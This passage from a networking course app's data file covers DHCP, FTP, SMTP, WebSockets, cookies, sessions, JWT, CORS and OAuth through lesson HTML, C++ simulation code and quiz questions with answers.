    cout << "Path: " << path << endl;
}

int main() {
    // DNS Cache demo
    DNSCache cache;
    cache.addRecord("www.google.com", "142.250.80.4", "A", 300);
    cache.addRecord("www.example.com", "93.184.216.34", "A", 3600);
    cache.addRecord("mail.google.com", "142.250.80.5", "A", 300);
    cache.display();

    cout << "\\nResolving domains:" << endl;
    cache.resolve("www.google.com");  // HIT
    cache.resolve("www.github.com");  // MISS

    // DNS resolution simulation
    simulateDNSResolution("www.google.com");

    // URL parsing
    parseURL("https://www.example.com:8080/api/v1/users?page=1");
    parseURL("http://localhost/index.html");

    return 0;
}`,
          problems: [
            ['DNS Lookup Concepts', 'https://www.geeksforgeeks.org/dns-domain-name-server/', 'Easy'],
            ['Design Tiny URL (LeetCode 535)', 'https://leetcode.com/problems/encode-and-decode-tinyurl/', 'Medium'],
            ['Web Crawler (LeetCode 1236)', 'https://leetcode.com/problems/web-crawler/', 'Medium'],
            ['DNS Record Types', 'https://www.geeksforgeeks.org/dns-domain-name-server/', 'Easy'],
            ['LRU Cache (LeetCode 146) — relates to DNS caching', 'https://leetcode.com/problems/lru-cache/', 'Medium']
          ],
          mcqs: [
            {q: 'Which HTTP method is NOT idempotent?', o: ['GET', 'PUT', 'DELETE', 'POST'], a: 3},
            {q: 'DNS primarily uses which transport protocol?', o: ['TCP', 'UDP', 'SCTP', 'QUIC'], a: 1},
            {q: 'HTTP/2 introduced which key feature to solve head-of-line blocking?', o: ['Persistent connections', 'Pipelining', 'Multiplexing with binary framing', 'Chunked transfer encoding'], a: 2},
            {q: 'HTTP/3 uses which transport?', o: ['TCP', 'UDP (via QUIC)', 'SCTP', 'DCCP'], a: 1},
            {q: 'Which DNS record maps domain to IPv6?', o: ['A', 'AAAA', 'CNAME', 'MX'], a: 1},
            {q: 'HTTP 304 means:', o: ['Moved Permanently', 'Bad Request', 'Not Modified', 'Service Unavailable'], a: 2},
            {q: 'TLS 1.3 handshake requires:', o: ['0-RTT always', '1-RTT (0-RTT resumption option)', '2-RTT', '3-RTT'], a: 1},
            {q: 'Which HTTP header enables virtual hosting?', o: ['Accept', 'Host', 'Referer', 'Origin'], a: 1}
          ],
        },
        {
          t: 'DHCP, FTP, SMTP & WebSockets',
          learn: '<div class="learn-section"><div class="learn-h">Why This Matters</div><p class="learn-p">Every device connecting to a network gets its IP via <b>DHCP</b>\'s DORA process. <b>SMTP</b> powers every email. <b>WebSockets</b> enable real-time bidirectional communication — critical for live trading dashboards, chat apps, and collaborative tools. Knowing these protocols demonstrates breadth in application-layer networking.</p></div><div class="learn-section"><div class="learn-h">DHCP (Dynamic Host Configuration Protocol)</div><p class="learn-p"><b>DHCP</b> automatically assigns IP addresses and other network configuration (subnet mask, default gateway, DNS server) to devices on a network. Without DHCP, every device would need <b>manual IP configuration</b>. DHCP uses <b>UDP ports 67 (server) and 68 (client)</b>.</p><p class="learn-p"><b>DORA Process (DHCP 4-step handshake):</b></p><ol class="learn-list"><li><b>Discover:</b> Client broadcasts a DHCP Discover message to find DHCP servers. (Src: 0.0.0.0, Dst: 255.255.255.255)</li><li><b>Offer:</b> DHCP server responds with an available IP address and configuration offer. (Broadcast or unicast)</li><li><b>Request:</b> Client broadcasts a DHCP Request, accepting the offer (may reach multiple servers; only one offer accepted).</li><li><b>Acknowledge:</b> Server sends DHCP ACK confirming the lease. Client configures its interface.</li></ol><div class="learn-code">DORA Process:\n\nClient                      DHCP Server\n  |-- DHCPDISCOVER (broadcast) --&gt;|\n  |&lt;-- DHCPOFFER (IP=10.0.0.5) ---|  (unicast or broadcast)\n  |-- DHCPREQUEST (for 10.0.0.5) -&gt;| (broadcast)\n  |&lt;-- DHCPACK -------------------|  Lease granted!\n  |\n  | Now client has IP 10.0.0.5\n  | Lease duration: e.g., 24 hours\n  | At 50% lease: try DHCP Renew (unicast to server)\n  | At 87.5% lease: DHCP Rebind (broadcast)</div><div class="learn-tip"><b>Tip:</b> DHCP relay agents (IP helpers) allow DHCP to work across different subnets by forwarding DHCP broadcasts as unicast to the DHCP server on another subnet.</div></div><div class="learn-section"><div class="learn-h">FTP (File Transfer Protocol)</div><p class="learn-p"><b>FTP</b> is used for transferring files between client and server. It uses <b>two separate TCP connections</b>:</p><ul class="learn-list"><li><b>Control connection (port 21):</b> Commands and responses (USER, PASS, LIST, RETR, STOR, etc.). Persistent throughout the session.</li><li><b>Data connection (port 20 or ephemeral):</b> Actual file data transfer. Opened/closed per transfer.</li></ul><p class="learn-p"><b>Active vs Passive Mode:</b></p><table class="learn-table"><tr><th>Feature</th><th>Active Mode</th><th>Passive Mode</th></tr><tr><td>Data connection initiated by</td><td>Server (from port 20)</td><td>Client</td></tr><tr><td>Firewall friendly?</td><td>No (server connects to client)</td><td>Yes (client connects to server)</td></tr><tr><td>Command</td><td>PORT</td><td>PASV</td></tr></table><div class="learn-warn"><b>Warning:</b> FTP transmits credentials <b>in plaintext</b>. Use <b>SFTP</b> (SSH File Transfer Protocol, port 22) or <b>FTPS</b> (FTP over TLS) for secure file transfers. SFTP is NOT FTP over SSH — it is a completely different protocol built into SSH.</div></div><div class="learn-section"><div class="learn-h">SMTP (Simple Mail Transfer Protocol)</div><p class="learn-p"><b>SMTP</b> is used for <b>sending</b> emails. It operates on <b>TCP port 25</b> (or 587 for submission with authentication). SMTP is a <b>push protocol</b> — the sender pushes the email to the receiver\'s mail server.</p><div class="learn-code">SMTP Session Example:\n\nClient: HELO client.example.com\nServer: 250 Hello client.example.com\nClient: MAIL FROM:&lt;alice@example.com&gt;\nServer: 250 OK\nClient: RCPT TO:&lt;bob@another.com&gt;\nServer: 250 OK\nClient: DATA\nServer: 354 Start mail input\nClient: Subject: Hello\nClient: \nClient: Hi Bob, how are you?\nClient: .\nServer: 250 OK, message queued\nClient: QUIT\nServer: 221 Bye</div><p class="learn-p"><b>Email Protocol Stack:</b></p><ul class="learn-list"><li><b>SMTP:</b> Sending emails (client to server, server to server).</li><li><b>POP3 (port 110):</b> Retrieving emails. Downloads and (typically) deletes from server. Simple, not ideal for multi-device.</li><li><b>IMAP (port 143):</b> Retrieving emails. Keeps emails on server, supports folders. Better for multi-device access.</li></ul><div class="learn-code">Email Delivery Path:\n\nAlice (MUA) --SMTP--> Alice\'s Mail Server (MTA)\n                       |\n                  DNS MX lookup for bob\'s domain\n                       |\n                  --SMTP--> Bob\'s Mail Server (MTA)\n                                |\n                           Bob (MUA) --POP3/IMAP--> retrieves email</div></div><div class="learn-section"><div class="learn-h">WebSockets</div><p class="learn-p"><b>WebSockets</b> provide <b>full-duplex, bidirectional</b> communication over a <b>single TCP connection</b>. Unlike HTTP (request-response), WebSockets allow the server to <b>push data to the client</b> without the client requesting it. This is ideal for real-time applications.</p><p class="learn-p"><b>WebSocket Handshake (HTTP Upgrade):</b></p><div class="learn-code">Client Request:\nGET /chat HTTP/1.1\nHost: server.example.com\nUpgrade: websocket\nConnection: Upgrade\nSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\nSec-WebSocket-Version: 13\n\nServer Response:\nHTTP/1.1 101 Switching Protocols\nUpgrade: websocket\nConnection: Upgrade\nSec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=\n\n(Now the connection is upgraded from HTTP to WebSocket.\n Both sides can send frames freely.)</div><p class="learn-p"><b>WebSockets vs HTTP Polling vs SSE:</b></p><table class="learn-table"><tr><th>Feature</th><th>HTTP Polling</th><th>Long Polling</th><th>SSE (Server-Sent Events)</th><th>WebSockets</th></tr><tr><td>Direction</td><td>Client &rarr; Server</td><td>Client &rarr; Server</td><td>Server &rarr; Client</td><td>Bidirectional</td></tr><tr><td>Latency</td><td>High (interval)</td><td>Medium</td><td>Low</td><td>Very Low</td></tr><tr><td>Overhead</td><td>High (repeated HTTP)</td><td>Medium</td><td>Low</td><td>Very Low (2-byte frame)</td></tr><tr><td>Protocol</td><td>HTTP</td><td>HTTP</td><td>HTTP</td><td>ws:// or wss://</td></tr><tr><td>Use Case</td><td>Simple status checks</td><td>Chat (old approach)</td><td>News feeds, notifications</td><td>Real-time apps, gaming, trading</td></tr></table></div><div class="learn-section"><div class="learn-h">Other Application Layer Protocols</div><p class="learn-p"><b>Telnet (port 23):</b> Remote terminal access. Plaintext, insecure. Replaced by SSH.</p><p class="learn-p"><b>SSH (port 22):</b> Secure remote shell access. Provides encryption, authentication, and tunneling. Uses public-key or password authentication.</p><p class="learn-p"><b>SNMP (port 161 UDP):</b> Simple Network Management Protocol. Used for monitoring and managing network devices (routers, switches, servers).</p><p class="learn-p"><b>NTP (port 123 UDP):</b> Network Time Protocol. Synchronizes clocks across network devices. Critical for logging, certificates, and distributed systems.</p></div><div class="learn-section"><div class="learn-h">REST vs GraphQL vs gRPC</div><p class="learn-p">Modern APIs use different communication patterns:</p><table class="learn-table"><tr><th>Feature</th><th>REST</th><th>GraphQL</th><th>gRPC</th></tr><tr><td>Protocol</td><td>HTTP/1.1 or HTTP/2</td><td>HTTP</td><td>HTTP/2</td></tr><tr><td>Data Format</td><td>JSON (typically)</td><td>JSON</td><td>Protocol Buffers (binary)</td></tr><tr><td>Schema</td><td>OpenAPI/Swagger</td><td>GraphQL Schema</td><td>.proto files</td></tr><tr><td>Fetching</td><td>Multiple endpoints</td><td>Single endpoint, client specifies fields</td><td>RPC methods</td></tr><tr><td>Over/Under-fetching</td><td>Common problem</td><td>Solved (client controls)</td><td>N/A (defined messages)</td></tr><tr><td>Use Case</td><td>Web APIs, CRUD</td><td>Complex frontends, mobile</td><td>Microservices, low-latency</td></tr></table><div class="learn-tip"><b>Tip:</b> In interviews, understanding REST API design principles (resource-based URLs, proper HTTP methods, status codes, pagination, versioning) is commonly tested alongside system design questions.</div></div><div class="learn-section"><div class="learn-h">Interview Spotlight</div><p class="learn-p"><b>Q1: Walk through DHCP DORA.</b><br>A: (1) Discover — client broadcasts to find servers. (2) Offer — server proposes IP, mask, gateway, DNS, lease time. (3) Request — client broadcasts acceptance. (4) Acknowledge — server confirms lease. Renewal at 50% lease (unicast), rebind at 87.5% (broadcast).</p><p class="learn-p"><b>Q2: Why does FTP use two connections?</b><br>A: Control (port 21) carries commands for entire session. Data (port 20 active, ephemeral passive) opens/closes per transfer. Separation allows commands during transfer. Passive mode is firewall-friendly (client initiates both).</p><p class="learn-p"><b>Q3: WebSockets vs long polling vs SSE?</b><br>A: Long polling: repeated HTTP requests, unidirectional, high overhead. SSE: server pushes over HTTP, unidirectional, auto-reconnect. WebSockets: bidirectional on single TCP, minimal framing (2-byte header), HTTP Upgrade handshake. WebSockets best for real-time bidirectional apps.</p><p class="learn-p"><b>Q4: POP3 vs IMAP?</b><br>A: POP3 (port 110): downloads and deletes from server, simple, poor for multi-device. IMAP (port 143): keeps on server, supports folders/flags, better for multi-device. Most modern clients use IMAP.</p><p class="learn-p"><b>Q5: How does WebSocket handshake work?</b><br>A: Client sends HTTP GET with Upgrade: websocket, Connection: Upgrade, Sec-WebSocket-Key. Server responds 101 Switching Protocols with Sec-WebSocket-Accept (SHA-1 hash of key + magic GUID). Connection upgrades to WebSocket protocol.</p></div>',
          code: `// === Application Layer Protocol Simulations in C++ ===
#include <iostream>
#include <string>
#include <vector>
#include <map>
#include <sstream>
#include <ctime>
using namespace std;

// ---- DHCP Server Simulation ----
struct DHCPLease {
    string clientMAC;
    string assignedIP;
    int leaseTime; // seconds
    time_t leaseStart;
};

class DHCPServer {
    string networkPrefix;  // e.g., "192.168.1."
    int nextIP;
    int poolStart, poolEnd;
    string subnetMask, gateway, dnsServer;
    map<string, DHCPLease> leases;

public:
    DHCPServer(string prefix, int start, int end)
        : networkPrefix(prefix), nextIP(start),
          poolStart(start), poolEnd(end) {
        subnetMask = "255.255.255.0";
        gateway = prefix + "1";
        dnsServer = "8.8.8.8";
    }

    // DORA Process
    string handleDiscover(const string& clientMAC) {
        cout << "  DHCPDISCOVER from " << clientMAC << endl;
        string offeredIP = networkPrefix + to_string(nextIP);
        cout << "  DHCPOFFER: " << offeredIP << endl;
        return offeredIP;
    }

    void handleRequest(const string& clientMAC, const string& requestedIP) {
        cout << "  DHCPREQUEST for " << requestedIP
             << " from " << clientMAC << endl;

        DHCPLease lease;
        lease.clientMAC = clientMAC;
        lease.assignedIP = requestedIP;
        lease.leaseTime = 86400; // 24 hours
        lease.leaseStart = time(nullptr);
        leases[clientMAC] = lease;
        nextIP++;

        cout << "  DHCPACK: " << requestedIP << " leased for "
             << lease.leaseTime << "s" << endl;
        cout << "    Subnet Mask: " << subnetMask << endl;
        cout << "    Gateway:     " << gateway << endl;
        cout << "    DNS Server:  " << dnsServer << endl;
    }

    void displayLeases() {
        cout << "\\n  Active Leases:" << endl;
        for (auto& [mac, lease] : leases) {
            cout << "    " << lease.clientMAC << " -> "
                 << lease.assignedIP << " (TTL: "
                 << lease.leaseTime << "s)" << endl;
        }
    }
};

void simulateDHCP() {
    cout << "=== DHCP DORA Simulation ===" << endl;
    DHCPServer server("192.168.1.", 100, 200);

    // Client 1
    string mac1 = "AA:BB:CC:11:22:33";
    string ip1 = server.handleDiscover(mac1);
    server.handleRequest(mac1, ip1);

    // Client 2
    string mac2 = "DD:EE:FF:44:55:66";
    string ip2 = server.handleDiscover(mac2);
    server.handleRequest(mac2, ip2);

    server.displayLeases();
}

// ---- FTP Command Simulation ----
void simulateFTP() {
    cout << "\\n=== FTP Session Simulation ===" << endl;

    struct FTPExchange { string client; string server; };
    vector<FTPExchange> session = {
        {"(Connect to port 21)", "220 Welcome to FTP Server"},
        {"USER admin", "331 Password required"},
        {"PASS secret123", "230 Login successful"},
        {"PWD", "257 \"/home/admin\" is current directory"},
        {"PASV", "227 Entering Passive Mode (192,168,1,1,4,1)"},
        {"LIST", "150 Opening data connection\\n"
                 "drwxr-xr-x  docs/\\n"
                 "-rw-r--r--  readme.txt (1024 bytes)\\n"
                 "226 Transfer complete"},
        {"RETR readme.txt", "150 Opening BINARY mode data connection\\n"
                            "226 Transfer complete (1024 bytes)"},
        {"QUIT", "221 Goodbye"},
    };

    for (auto& ex : session) {
        cout << "  C: " << ex.client << endl;
        cout << "  S: " << ex.server << endl;
    }
}

// ---- SMTP Email Sending Simulation ----
void simulateSMTP() {
    cout << "\\n=== SMTP Session Simulation ===" << endl;

    struct SMTPExchange { string client; string server; };
    vector<SMTPExchange> session = {
        {"(Connect to port 25)", "220 mail.example.com SMTP Ready"},
        {"EHLO client.example.com",
         "250-mail.example.com\\n250-AUTH PLAIN LOGIN\\n250 OK"},
        {"MAIL FROM:<alice@example.com>", "250 OK"},
        {"RCPT TO:<bob@example.com>", "250 OK"},
        {"DATA", "354 Start mail input; end with <CRLF>.<CRLF>"},
        {"From: alice@example.com\\n"
         "To: bob@example.com\\n"
         "Subject: Interview Schedule\\n"
         "Date: Mon, 15 Jun 2026 10:00:00\\n\\n"
         "Hi Bob,\\nYour interview is at 2 PM.\\n.",
         "250 OK, message ID: <abc123@mail.example.com>"},
        {"QUIT", "221 Bye"},
    };

    for (auto& ex : session) {
        cout << "  C: " << ex.client << endl;
        cout << "  S: " << ex.server << endl;
    }
}

// ---- WebSocket Frame Structure ----
void explainWebSocketFrame() {
    cout << "\\n=== WebSocket Frame Format ===" << endl;
    cout << " 0                   1                   2" << endl;
    cout << " 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3" << endl;
    cout << "+-+-+-+-+-------+-+-------------+----------------+" << endl;
    cout << "|F|R|R|R| opcode|M| Payload len |  Extended len  |" << endl;
    cout << "|I|S|S|S| (4)   |A|   (7)       |  (16/64 bits)  |" << endl;
    cout << "|N|V|V|V|       |S|             |                |" << endl;
    cout << "+-+-+-+-+-------+-+-------------+----------------+" << endl;
    cout << "|          Masking key (if MASK=1, 32 bits)       |" << endl;
    cout << "+------------------------------------------------+" << endl;
    cout << "|          Payload Data                           |" << endl;
    cout << "+------------------------------------------------+" << endl;
    cout << "\\nOpcodes:" << endl;
    cout << "  0x0: Continuation  0x1: Text  0x2: Binary" << endl;
    cout << "  0x8: Close  0x9: Ping  0xA: Pong" << endl;
}

// ---- Simple REST API Router Simulation ----
void simulateRESTAPI() {
    cout << "\\n=== REST API Router ===" << endl;

    struct Request { string method; string path; string body; };
    vector<Request> requests = {
        {"GET",    "/api/users",     ""},
        {"POST",   "/api/users",     "{\"name\":\"Alice\"}"},
        {"GET",    "/api/users/1",   ""},
        {"PUT",    "/api/users/1",   "{\"name\":\"Bob\"}"},
        {"DELETE", "/api/users/1",   ""},
    };

    map<string, string> responses = {
        {"GET /api/users",     "200 OK [{\"id\":1,\"name\":\"Alice\"}]"},
        {"POST /api/users",    "201 Created {\"id\":2,\"name\":\"Alice\"}"},
        {"GET /api/users/1",   "200 OK {\"id\":1,\"name\":\"Alice\"}"},
        {"PUT /api/users/1",   "200 OK {\"id\":1,\"name\":\"Bob\"}"},
        {"DELETE /api/users/1","204 No Content"},
    };

    for (auto& req : requests) {
        string key = req.method + " " + req.path;
        cout << "  " << req.method << " " << req.path;
        if (!req.body.empty()) cout << " Body: " << req.body;
        cout << endl;
        cout << "  -> " << responses[key] << endl << endl;
    }
}

int main() {
    simulateDHCP();
    simulateFTP();
    simulateSMTP();
    explainWebSocketFrame();
    simulateRESTAPI();
    return 0;
}`,
          problems: [
            ['DHCP Process Questions', 'https://www.geeksforgeeks.org/dynamic-host-configuration-protocol-dhcp/', 'Easy'],
            ['SMTP Protocol Practice', 'https://www.geeksforgeeks.org/simple-mail-transfer-protocol-smtp/', 'Easy'],
            ['WebSocket Concepts', 'https://www.geeksforgeeks.org/what-is-web-socket-and-how-it-is-different-from-the-http/', 'Medium']
          ],
          mcqs: [
            {q: 'The DHCP DORA process stands for:', o: ['Discover, Offer, Request, Acknowledge', 'Download, Open, Read, Accept', 'Detect, Organize, Route, Assign', 'Discover, Open, Receive, Assign'], a: 0},
            {q: 'FTP uses two connections. The control connection is on port:', o: ['20', '21', '22', '25'], a: 1},
            {q: 'WebSocket connections are initiated via:', o: ['A special WebSocket SYN packet', 'An HTTP Upgrade request', 'A UDP handshake', 'A direct TCP connection to port 8080'], a: 1},
            {q: 'DHCP client first attempts renewal at what lease percentage?', o: ['25%', '50%', '75%', '87.5%'], a: 1},
            {q: 'SFTP runs over:', o: ['FTP + TLS', 'SSH (port 22)', 'HTTP', 'Telnet'], a: 1},
            {q: 'SMTP is a:', o: ['Push protocol', 'Pull protocol', 'Both', 'Neither'], a: 0},
            {q: 'WebSocket minimum frame overhead:', o: ['20 bytes', '8 bytes', '2 bytes', '0 bytes'], a: 2},
            {q: 'IMAP default port:', o: ['25', '110', '143', '993'], a: 2}
          ],
        },
        {
          t: 'Cookies, Sessions, CORS & Authentication',
          learn: '<div class="learn-section"><div class="learn-h">Why This Matters</div><p class="learn-p">HTTP is stateless, but real apps need state — authentication, carts, preferences. <b>Cookies</b> and <b>sessions</b> bridge this gap. Misconfigured cookie attributes create vulnerabilities (XSS, CSRF). <b>CORS</b> controls cross-origin API calls — every frontend developer encounters CORS errors. Understanding <b>JWT vs sessions</b> and <b>OAuth 2.0</b> is essential for system design interviews involving authentication at scale.</p></div><div class="learn-section"><div class="learn-h">HTTP Cookies</div><p class="learn-p"><b>Cookies</b> are small pieces of data (key-value pairs, max ~4KB) that the server sends to the browser via the <code>Set-Cookie</code> header. The browser stores them and sends them back with every subsequent request to the same domain.</p><div class="learn-code">// Server sets a cookie:\nHTTP/1.1 200 OK\nSet-Cookie: session_id=abc123; Path=/; HttpOnly; Secure; SameSite=Lax; Max-Age=3600\n\n// Browser sends cookie on subsequent requests:\nGET /dashboard HTTP/1.1\nCookie: session_id=abc123</div><p class="learn-p"><b>Cookie attributes:</b></p><table class="learn-table"><tr><th>Attribute</th><th>Purpose</th></tr><tr><td><code>HttpOnly</code></td><td>Cookie inaccessible to JavaScript (prevents XSS theft)</td></tr><tr><td><code>Secure</code></td><td>Only sent over HTTPS</td></tr><tr><td><code>SameSite=Strict|Lax|None</code></td><td>Controls cross-site sending (CSRF protection)</td></tr><tr><td><code>Max-Age</code> / <code>Expires</code></td><td>Cookie lifetime. No max-age = session cookie (deleted on browser close)</td></tr><tr><td><code>Domain</code></td><td>Which domains receive the cookie</td></tr><tr><td><code>Path</code></td><td>URL path scope for the cookie</td></tr></table></div><div class="learn-section"><div class="learn-h">Sessions</div><p class="learn-p">HTTP is <b>stateless</b> — each request is independent. <b>Sessions</b> maintain state across requests. The server stores session data (user info, cart, etc.) and gives the client a <b>session ID</b> (via cookie or URL).</p><div class="learn-code">Session flow:\n1. Client logs in: POST /login {user, password}\n2. Server creates session: sessions["abc123"] = {userId: 42, role: "admin"}\n3. Server sends: Set-Cookie: session_id=abc123\n4. Client sends cookie with every request\n5. Server looks up sessions["abc123"] to identify the user\n6. On logout: server deletes session, client clears cookie</div><p class="learn-p"><b>Session storage options:</b></p><table class="learn-table"><tr><th>Storage</th><th>Pros</th><th>Cons</th></tr><tr><td>In-memory (server)</td><td>Fast</td><td>Lost on restart, not scalable</td></tr><tr><td>Database</td><td>Persistent, shareable</td><td>Slower, DB load</td></tr><tr><td>Redis/Memcached</td><td>Fast + shareable + TTL</td><td>Extra infrastructure</td></tr></table></div><div class="learn-section"><div class="learn-h">JWT (JSON Web Tokens)</div><p class="learn-p"><b>JWT</b> is a <b>stateless</b> alternative to sessions. The server signs a token containing user claims and sends it to the client. No server-side session storage needed.</p><div class="learn-code">JWT Structure: header.payload.signature\n\nHeader:  {"alg": "HS256", "typ": "JWT"}\nPayload: {"sub": "42", "name": "Alice", "role": "admin", "exp": 1700000000}\nSignature: HMACSHA256(base64(header) + "." + base64(payload), secret)\n\n// Sent as: Authorization: Bearer eyJhbGci...token...</div><table class="learn-table"><tr><th></th><th>Sessions</th><th>JWT</th></tr><tr><td>State</td><td>Server-side (stateful)</td><td>Client-side (stateless)</td></tr><tr><td>Scalability</td><td>Need shared session store</td><td>Any server can verify</td></tr><tr><td>Revocation</td><td>Easy (delete session)</td><td>Hard (token valid until expiry)</td></tr><tr><td>Size</td><td>Small cookie (session ID)</td><td>Larger token (~1KB+)</td></tr></table></div><div class="learn-section"><div class="learn-h">CORS (Cross-Origin Resource Sharing)</div><p class="learn-p"><b>Same-Origin Policy (SOP)</b>: Browsers block JavaScript from making requests to a different origin (protocol + domain + port). <b>CORS</b> is the mechanism that relaxes this restriction.</p><div class="learn-code">// Origin = protocol + domain + port\nhttps://example.com:443  ← origin\n\n// Same origin:  https://example.com/page2\n// Different:    http://example.com (different protocol)\n// Different:    https://api.example.com (different subdomain)\n// Different:    https://example.com:8080 (different port)</div><p class="learn-p"><b>Preflight request:</b> For "non-simple" requests (PUT, DELETE, custom headers, JSON body), the browser first sends an <code>OPTIONS</code> request to check if the server allows it:</p><div class="learn-code">// Preflight request (browser sends automatically):\nOPTIONS /api/data HTTP/1.1\nOrigin: https://frontend.com\nAccess-Control-Request-Method: POST\nAccess-Control-Request-Headers: Content-Type, Authorization\n\n// Server response:\nHTTP/1.1 204 No Content\nAccess-Control-Allow-Origin: https://frontend.com\nAccess-Control-Allow-Methods: GET, POST, PUT, DELETE\nAccess-Control-Allow-Headers: Content-Type, Authorization\nAccess-Control-Max-Age: 86400  // cache preflight for 24h\nAccess-Control-Allow-Credentials: true</div><div class="learn-warn"><b>Security warning:</b> Never use <code>Access-Control-Allow-Origin: *</code> with <code>Access-Control-Allow-Credentials: true</code>. This is forbidden by the spec and would allow any website to make authenticated requests to your API.</div></div><div class="learn-section"><div class="learn-h">OAuth 2.0 (Overview)</div><p class="learn-p"><b>OAuth 2.0</b> is an authorization framework that allows third-party apps to access a user\'s resources without knowing their password (e.g., "Login with Google").</p><div class="learn-code">Authorization Code Flow (most secure):\n1. User clicks "Login with Google"\n2. App redirects to Google: /authorize?client_id=X&amp;redirect_uri=Y&amp;scope=email\n3. User authenticates with Google and consents\n4. Google redirects back: Y?code=AUTH_CODE\n5. App exchanges code for tokens (server-to-server):\n   POST /token {code, client_id, client_secret}\n6. Google returns: {access_token, refresh_token, id_token}\n7. App uses access_token to call Google APIs on user\'s behalf</div><div class="learn-tip"><b>Tip:</b> OAuth 2.0 is for <b>authorization</b> (what can you access), not authentication (who are you). <b>OpenID Connect (OIDC)</b> adds an authentication layer on top of OAuth 2.0 by introducing the <code>id_token</code> (a JWT containing user identity).</div></div><div class="learn-section"><div class="learn-h">Interview Spotlight</div><p class="learn-p"><b>Q1: Sessions vs JWT authentication?</b><br>A: Sessions: server stores state in memory/Redis, client holds session ID cookie. Needs shared store for scale. Easy revocation. JWTs: stateless — claims in signed token. Any server verifies without shared state. Hard to revoke before expiry. Larger (~1KB) than session cookies (~30 bytes).</p><p class="learn-p"><b>Q2: When does CORS preflight trigger?</b><br>A: Browser sends OPTIONS before "non-simple" requests: custom headers (Authorization, Content-Type: application/json), non-simple methods (PUT, DELETE), or credentials. Server must respond with Allow-Origin, Allow-Methods, Allow-Headers.</p><p class="learn-p"><b>Q3: Cookie attributes for XSS and CSRF prevention?</b><br>A: HttpOnly: prevents JS from reading cookie (XSS defense). Secure: HTTPS only. SameSite=Strict: blocks cross-site sending (CSRF defense). SameSite=Lax: allows on top-level navigations only — good default balance.</p><p class="learn-p"><b>Q4: OAuth 2.0 Authorization Code flow?</b><br>A: (1) User clicks "Login with Google." (2) Redirect to /authorize with client_id, redirect_uri, scope. (3) User authenticates and consents. (4) Redirect back with auth code. (5) Backend exchanges code for tokens via POST /token with client_secret. (6) Use access_token for API calls.</p><p class="learn-p"><b>Q5: What is Same-Origin Policy?</b><br>A: Restricts JS from making requests to different origins (origin = protocol + domain + port). Without it, malicious pages could read authenticated data from other sites using the user\'s cookies. CORS is the controlled mechanism to relax SOP.</p></div>',
          code: `// === Cookies, Sessions, and CORS Concepts ===
#include <iostream>
#include <string>
#include <map>
#include <vector>
#include <sstream>
using namespace std;

// Simulate cookie parsing
map<string, string> parseCookies(const string& cookieHeader) {
    map<string, string> cookies;
    stringstream ss(cookieHeader);
    string pair;
    while (getline(ss, pair, ';')) {
        size_t eq = pair.find('=');
        if (eq != string::npos) {
            string key = pair.substr(0, eq);
            string val = pair.substr(eq + 1);
            while (!key.empty() && key[0] == ' ') key = key.substr(1);
            cookies[key] = val;
        }
    }
    return cookies;
}

// Simulate session store
map<string, map<string, string>> sessionStore;

string createSession(const string& userId) {
    string sessionId = "sess_" + to_string(hash<string>{}(userId));
    sessionStore[sessionId]["userId"] = userId;
    sessionStore[sessionId]["created"] = "now";
    return sessionId;
}

map<string, string> getSession(const string& sessionId) {
    if (sessionStore.count(sessionId))
        return sessionStore[sessionId];
    return {};
}

// Simulate CORS check
bool checkCORS(const string& origin, const vector<string>& allowedOrigins) {
    for (const auto& allowed : allowedOrigins) {
        if (allowed == origin || allowed == "*") return true;
    }
    return false;
}

int main() {
    // Parse cookies
    string cookieHeader = "session_id=abc123; theme=dark; lang=en";
    auto cookies = parseCookies(cookieHeader);
    cout << "=== Cookie Parsing ===" << endl;
    for (auto& [k, v] : cookies)
        cout << "  " << k << " = " << v << endl;

    // Session management
    cout << "\\n=== Session Management ===" << endl;
    string sid = createSession("user42");
    cout << "Created session: " << sid << endl;
    auto session = getSession(sid);
    cout << "User ID: " << session["userId"] << endl;

    // CORS check
    cout << "\\n=== CORS Check ===" << endl;
    vector<string> allowed = {"https://frontend.com", "https://admin.com"};
    cout << "https://frontend.com: " << (checkCORS("https://frontend.com", allowed) ? "Allowed" : "Blocked") << endl;
    cout << "https://evil.com: " << (checkCORS("https://evil.com", allowed) ? "Allowed" : "Blocked") << endl;

    return 0;
}`,
          problems: [
            ['CORS Explained', 'https://www.geeksforgeeks.org/cross-origin-resource-sharing-cors/', 'Easy'],
            ['Session vs JWT', 'https://www.geeksforgeeks.org/session-vs-token-based-authentication/', 'Medium'],
            ['OAuth 2.0 Concepts', 'https://www.geeksforgeeks.org/workflow-of-oauth-2-0/', 'Medium'],
            ['JWT Structure & Verification', 'https://www.geeksforgeeks.org/json-web-token-jwt/', 'Medium'],
            ['CORS Configuration Best Practices', 'https://www.geeksforgeeks.org/cross-origin-resource-sharing-cors/', 'Medium'],
            ['OAuth 2.0 Authorization Code Flow', 'https://www.geeksforgeeks.org/workflow-of-oauth-2-0/', 'Hard']
          ],
          mcqs: [
            {q: 'Which cookie attribute prevents JavaScript from accessing the cookie?', o: ['Secure', 'SameSite', 'HttpOnly', 'Path'], a: 2},
            {q: 'A CORS preflight request uses which HTTP method?', o: ['GET', 'POST', 'HEAD', 'OPTIONS'], a: 3},
            {q: 'JWT tokens are stateless because:', o: ['They are encrypted', 'The server stores no session data — all claims are in the token', 'They use cookies', 'They expire automatically'], a: 1},
            {q: 'SameSite=Strict means:', o: ['Cookie sent on all requests', 'Cookie never sent cross-site', 'Cookie only over HTTPS', 'Cookie accessible by JS'], a: 1},
            {q: 'OAuth 2.0 is primarily for:', o: ['Authentication', 'Authorization', 'Encryption', 'Hashing'], a: 1},
            {q: 'A session cookie (no Max-Age) is deleted when:', o: ['After 24 hours', 'Browser is closed', 'Server restarts', 'Never'], a: 1},
            {q: 'Same origin requires matching:', o: ['Domain only', 'Domain and port', 'Protocol, domain, and port', 'Protocol and domain'], a: 2},
            {q: 'OpenID Connect adds to OAuth 2.0:', o: ['Encryption', 'Authentication layer (id_token)', 'Rate limiting', 'Certificate mgmt'], a: 1}
          ],
        },
      ]
    },
    // ==================== TAB 8: Network Security ====================
    {
      id: 'sec', t: 'Network Security',
      topics: [
        {
          t: 'SSL/TLS, Encryption & Firewalls',
